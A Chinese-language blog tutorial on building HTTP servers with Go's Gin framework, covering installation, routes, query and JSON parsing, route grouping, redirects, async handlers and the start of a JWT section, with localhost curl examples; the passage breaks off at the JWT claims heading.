    <content type="html"><![CDATA[<p>Go的一个比较流行的HTTP后台框架是Gin，若要搭建Go的HTTP后台，推荐直接学习Gin。</p><h2 id="Gin简介"><a href="#Gin简介" class="headerlink" title="Gin简介"></a>Gin简介</h2><p>Gin 特性</p><ul><li>快速：路由不使用反射，基于Radix树，内存占用少。</li><li>中间件：HTTP请求，可先经过一系列中间件处理，例如：Logger，Authorization，GZIP等。这个特性和 NodeJs 的 Koa 框架很像。中间件机制也极大地提高了框架的可扩展性。</li><li>异常处理：服务始终可用，不会宕机。Gin 可以捕获 panic，并恢复。而且有极为便利的机制处理HTTP请求过程中发生的错误。</li><li>JSON：Gin可以解析并验证请求的JSON。这个特性对Restful API的开发尤其有用。</li><li>路由分组：例如将需要授权和不需要授权的API分组，不同版本的API分组。而且分组可嵌套，且性能不受影响。</li><li>渲染内置：原生支持JSON，XML和HTML的渲染。</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li>go env -w GO111MODULE=on</li><li>go env -w GOPROXY=<a href="https://goproxy.io,direct/">https://goproxy.io,direct</a></li><li>设置后，重新运行： go get -u github.com/gin-gonic/gin，</li><li>在项目文件夹下运行 go mod init gin</li><li>在项目文件夹下运行 go mod edit -require github.com/gin-gonic/gin@latest</li></ol><h2 id="一个最基本的web框架实践"><a href="#一个最基本的web框架实践" class="headerlink" title="一个最基本的web框架实践"></a>一个最基本的web框架实践</h2><p>一个最简单的web框架，实现了get和post两种方式，幷绑定了端口9999进行监听。实现的基本功能：</p><ol><li>绑定指定端口9999进行监听</li><li>实现了get和post两种方式</li><li>实现了路由解析，不同的路由会由对用的函数进行处理请求</li><li>实现了解析请求格式为query string的请求</li><li>实现了解析参数格式为json的请求</li><li>实现了json响应的回复</li></ol><p><strong>路由方法有 GET, POST, PUT, PATCH, DELETE 和 OPTIONS，还有Any，可匹配以上任意类型的请求。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HelloWeb</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;Hello, Go\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HiWeb</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;Hi, Go\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析query string， 匹配users?name=xxx&amp;role=xxx&amp;age=xx，role可选</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">QueryUser</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">name := c.Query(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">age := c.Query(<span class="string">&quot;age&quot;</span>)</span><br><span class="line">role := c.DefaultQuery(<span class="string">&quot;role&quot;</span>, <span class="string">&quot;teacher&quot;</span>)</span><br><span class="line">resp := fmt.Sprintf(<span class="string">&quot;my name is %s, my age is %s, my role is %s\n&quot;</span>, name, age, role)</span><br><span class="line">c.String(http.StatusOK, resp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> &#123;</span><br><span class="line">User <span class="keyword">string</span> <span class="string">`json:&quot;user&quot;`</span></span><br><span class="line">Password <span class="keyword">string</span> <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析json格式的请求</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoginCheck</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> req Login</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;req); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">resp := gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;someJSON&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="number">200</span>&#125;</span><br><span class="line">c.JSON(http.StatusOK, resp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">type</span> Response <span class="keyword">struct</span> &#123;</span><br><span class="line">Name    <span class="keyword">string</span></span><br><span class="line">Message <span class="keyword">string</span></span><br><span class="line">Status  <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoginCheck2</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> req Login</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;req); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> resp Response</span><br><span class="line">resp.Name = req.User</span><br><span class="line">resp.Message = <span class="string">&quot;OKOK&quot;</span></span><br><span class="line">resp.Status = <span class="number">200</span></span><br><span class="line">c.JSON(http.StatusOK, resp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/hello&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">HelloWeb(c)</span><br><span class="line">&#125;)</span><br><span class="line">r.POST(<span class="string">&quot;/hi&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">HiWeb(c)</span><br><span class="line">&#125;)</span><br><span class="line">r.GET(<span class="string">&quot;/user&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">QueryUser(c)</span><br><span class="line">&#125;)</span><br><span class="line">r.POST(<span class="string">&quot;/login&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">LoginCheck(c)</span><br><span class="line">&#125;)</span><br><span class="line">r.POST(<span class="string">&quot;/login2&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">LoginCheck2(c)</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;:9999&quot;</span>) <span class="comment">//  listen and serve on 0.0.0.0:9999</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问对应的URL</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:~ junshili$ curl -X POST http://localhost:9999/hi</span><br><span class="line">Hi, Go</span><br><span class="line">junshideMacBook-Pro:~ junshili$ curl http://localhost:9999/hello</span><br><span class="line">Hello, Go</span><br><span class="line"></span><br><span class="line">junshideMacBook-Pro:~ junshili$ curl &quot;http://localhost:9999/user?name=James&amp;age=19&amp;role=student&quot;</span><br><span class="line">my name is James, my age is 19, my role is student</span><br><span class="line"></span><br><span class="line">curl -X POST http://localhost:9999/login -d &#x27;&#123;&quot;user&quot;:&quot;kk&quot;, &quot;password&quot;:&quot;123&quot;&#125;&#x27; -H &quot;content-type:application/json&quot;</span><br><span class="line">&#123;&quot;message&quot;:&quot;someJSON&quot;,&quot;status&quot;:200&#125;</span><br><span class="line"></span><br><span class="line">junshideMacBook-Pro:~ junshili$ curl -X POST http://localhost:9999/login2 -d &#x27;&#123;&quot;user&quot;:&quot;kk&quot;, &quot;password&quot;:&quot;123&quot;&#125;&#x27; -H &quot;content-type:application/json&quot;</span><br><span class="line">&#123;&quot;Name&quot;:&quot;kk&quot;,&quot;Message&quot;:&quot;OKOK&quot;,&quot;Status&quot;:200&#125;</span><br></pre></td></tr></table></figure><h2 id="一个带有复杂路由项目实践"><a href="#一个带有复杂路由项目实践" class="headerlink" title="一个带有复杂路由项目实践"></a>一个带有复杂路由项目实践</h2><p>当项目大到一定程度后，上面再main.go里写处理函数的方式已经不再适用，一个更合适的方法是把处理函数迁移到一个文件里单独写逻辑，而main.go里越简单越好，只做路由选择，不做业务函数的实现。</p><p>因此，项目按照该树结构来组织，routers放各个业务代码的实现，一个文件对应一个子业务，比如这里的login和user。main.go里不再写业务逻辑，唯一的功能就是做路由注册（调用SetupUserRouter）。这样一来，复杂的web项目也能清晰管理了。</p><p>main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;web_demo/routers&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">    routers.SetupUserRouter(r)</span><br><span class="line">routers.SetupLoginRouter(r)</span><br><span class="line">    <span class="keyword">if</span> err := r.Run(<span class="string">&quot;:9999&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;startup service failed, err:%v\n&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析query string， 匹配users?name=xxx&amp;role=xxx&amp;age=xx，role可选</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">QueryUser</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">name := c.Query(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">age := c.Query(<span class="string">&quot;age&quot;</span>)</span><br><span class="line">role := c.DefaultQuery(<span class="string">&quot;role&quot;</span>, <span class="string">&quot;teacher&quot;</span>)</span><br><span class="line">resp := fmt.Sprintf(<span class="string">&quot;my name is %s, my age is %s, my role is %s\n&quot;</span>, name, age, role)</span><br><span class="line">c.String(http.StatusOK, resp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SetupUserRouter</span><span class="params">(e *gin.Engine)</span></span> &#123;</span><br><span class="line">e.GET(<span class="string">&quot;/users&quot;</span>, QueryUser)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>login.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> &#123;</span><br><span class="line">User <span class="keyword">string</span> <span class="string">`json:&quot;user&quot;`</span></span><br><span class="line">Password <span class="keyword">string</span> <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析json格式的请求</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoginCheck</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> req Login</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;req); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">resp := gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;someJSON&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="number">200</span>&#125;</span><br><span class="line">c.JSON(http.StatusOK, resp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SetupLoginRouter</span><span class="params">(e *gin.Engine)</span></span> &#123;</span><br><span class="line">e.POST(<span class="string">&quot;/login&quot;</span>, LoginCheck)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请求和响应</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:9999/users?name=James&amp;age=19&amp;role=student&quot;</span><br><span class="line">my name is James, my age is 19, my role is student</span><br><span class="line"></span><br><span class="line">junshideMacBook-Pro:web junshili$ curl -X POST http://localhost:9999/login -d &#x27;&#123;&quot;user&quot;:&quot;kk&quot;, &quot;password&quot;:&quot;123&quot;&#125;&#x27; -H &quot;content-type:application/json&quot;</span><br><span class="line">&#123;&quot;message&quot;:&quot;someJSON&quot;,&quot;status&quot;:200&#125;</span><br></pre></td></tr></table></figure><h2 id="分组路由"><a href="#分组路由" class="headerlink" title="分组路由"></a>分组路由</h2><p>如果有一组路由，前缀都是/api/v1开头，是否每个路由都需要加上/api/v1这个前缀呢？答案是不需要，分组路由可以解决这个问题。利用分组路由还可以更好地实现权限控制，例如将需要登录鉴权的路由放到同一分组中去，简化权限控制。</p><p>比如我们改写login.go，请求URL调整为login/logincheck2和login/logincheck这两个路径，此时我们使用Group函数即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> &#123;</span><br><span class="line">User <span class="keyword">string</span> <span class="string">`json:&quot;user&quot;`</span></span><br><span class="line">Password <span class="keyword">string</span> <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析json格式的请求</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoginCheck</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> req Login</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;req); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">resp := gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;someJSON&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="number">200</span>&#125;</span><br><span class="line">c.JSON(http.StatusOK, resp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析json格式的请求</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoginCheck2</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> req Login</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;req); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">resp := gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;someJSON2&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="number">200</span>&#125;</span><br><span class="line">c.JSON(http.StatusOK, resp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SetupLoginRouter</span><span class="params">(e *gin.Engine)</span></span> &#123;</span><br><span class="line">v1 := e.Group(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">v1.POST(<span class="string">&quot;/logincheck&quot;</span>, LoginCheck)</span><br><span class="line">v1.POST(<span class="string">&quot;/logincheck2&quot;</span>, LoginCheck2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请求和响应</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:web junshili$ curl -X POST http://localhost:9999/login/logincheck2 -d &#x27;&#123;&quot;user&quot;:&quot;kk&quot;, &quot;password&quot;:&quot;123&quot;&#125;&#x27; -H &quot;content-type:application/json&quot;</span><br><span class="line">&#123;&quot;message&quot;:&quot;someJSON2&quot;,&quot;status&quot;:200&#125;</span><br></pre></td></tr></table></figure><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>http 关于重定向的状态码：301，302</p><ul><li>301 redirect: 301 代表永久性转移(Permanently Moved)</li><li>302 redirect: 302 代表暂时性转移(Temporarily Moved )</li><li>301表示旧地址A的资源已经被永久地移除了（这个资源不可访问了），搜索引擎在抓取新内容的同时也将旧的网址交换为重定向之后的网址；</li><li>302表示旧地址A的资源还在（仍然可以访问），这个重定向只是临时地从旧地址A跳转到地址B，搜索引擎会抓取新的内容而保存旧的网址。</li></ul><p>修改users.go，实现永久重定向</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SetupUserRouter</span><span class="params">(e *gin.Engine)</span></span> &#123;</span><br><span class="line">v1 := e.Group(<span class="string">&quot;/users&quot;</span>)</span><br><span class="line">v1.GET(<span class="string">&quot;/user&quot;</span>, QueryUser)</span><br><span class="line"></span><br><span class="line">v1.GET(<span class="string">&quot;/redirect&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.Redirect(http.StatusMovedPermanently, <span class="string">&quot;/users&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请求和响应，通过响应可以看到，该url已经被重定向到/index了，请求发起者可以根据这个回复重新调整自己的请求路径。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:9999/users/redirect?name=James&amp;age=19&amp;role=student&quot;</span><br><span class="line">&lt;a href=&quot;/index&quot;&gt;Moved Permanently&lt;/a&gt;.</span><br></pre></td></tr></table></figure><h2 id="同步异步"><a href="#同步异步" class="headerlink" title="同步异步"></a>同步异步</h2><ul><li>goroutine机制可以方便地实现异步处理</li><li>另外，在启动新的goroutine时，不应该使用原始上下文，必须使用它的只读副本</li></ul><p>考虑这样的场景：客户端请求web服务器进行一个复杂计算，这个计算任务耗时比较久，因此一个比较好的做法是异步处理，客户端只是提交计算任务，服务器收到任务后把任务存储进消息队列，就直接回复客户端任务已收到，断开本次连接，待消息队列的任务被处理完后，再主动发起请求通知客户端。这个就是一个典型的异步处理的场景。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line"><span class="comment">// 同步</span></span><br><span class="line">r.GET(<span class="string">&quot;/sync&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">time.Sleep(<span class="number">3</span> * time.Second)</span><br><span class="line">fmt.Println(<span class="string">&quot;同步执行：&quot;</span>, c.Request.URL.Path)</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;同步执行&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 异步</span></span><br><span class="line">    r.GET(<span class="string">&quot;/async&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        <span class="comment">// 需要搞一个副本</span></span><br><span class="line">        copyContext := c.Copy()</span><br><span class="line">        <span class="comment">// 异步处理</span></span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            time.Sleep(<span class="number">3</span> * time.Second)</span><br><span class="line">            fmt.Println(<span class="string">&quot;异步执行：&quot;</span> + copyContext.Request.URL.Path)</span><br><span class="line">        &#125;()</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;异步执行&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">r.Run() <span class="comment">//  listen and serve on 0.0.0.0:8080</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请求和响应，可以看出异步请求是秒回的，而同步请求花费了3s。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:web junshili$ time curl &quot;http://localhost:8080/async&quot;</span><br><span class="line">异步执行</span><br><span class="line">real0m0.017s</span><br><span class="line">user0m0.007s</span><br><span class="line">sys0m0.007s</span><br><span class="line">junshideMacBook-Pro:web junshili$ time curl &quot;http://localhost:8080/sync&quot;</span><br><span class="line">同步执行</span><br><span class="line">real0m3.021s</span><br><span class="line">user0m0.008s</span><br><span class="line">sys0m0.008s</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="token令牌"><a href="#token令牌" class="headerlink" title="token令牌"></a>token令牌</h2><p>Web服务器中身份验证是个重要的功能，比如app用户需要先登录才能操作一些内部功能。其中令牌身份验证是个常用的手段。</p><p>JSON Web令牌（JWT）作为令牌系统而不是在每次请求时都发送用户名和密码，因此比其他方法（如基本身份验证）具有固有的优势。JWT主要有两个部分：提供用户名和密码以获取令牌；并根据请求检查该令牌。</p><p>jwt由以下三部分构成：</p><ul><li>Header:头部 （对应：Header）</li><li>Claims:声明 (对应：Payload)</li><li>Signature:签名 (对应：Signature)</li></ul><p><img src="/2021/05/05/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AF%87/1.png" alt="image"></p><h3 id="Header头部"><a href="#Header头部" class="headerlink" title="Header头部"></a>Header头部</h3><p>Header中指明jwt的签名算法，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Claims声明"><a href="#Claims声明" class="headerlink" 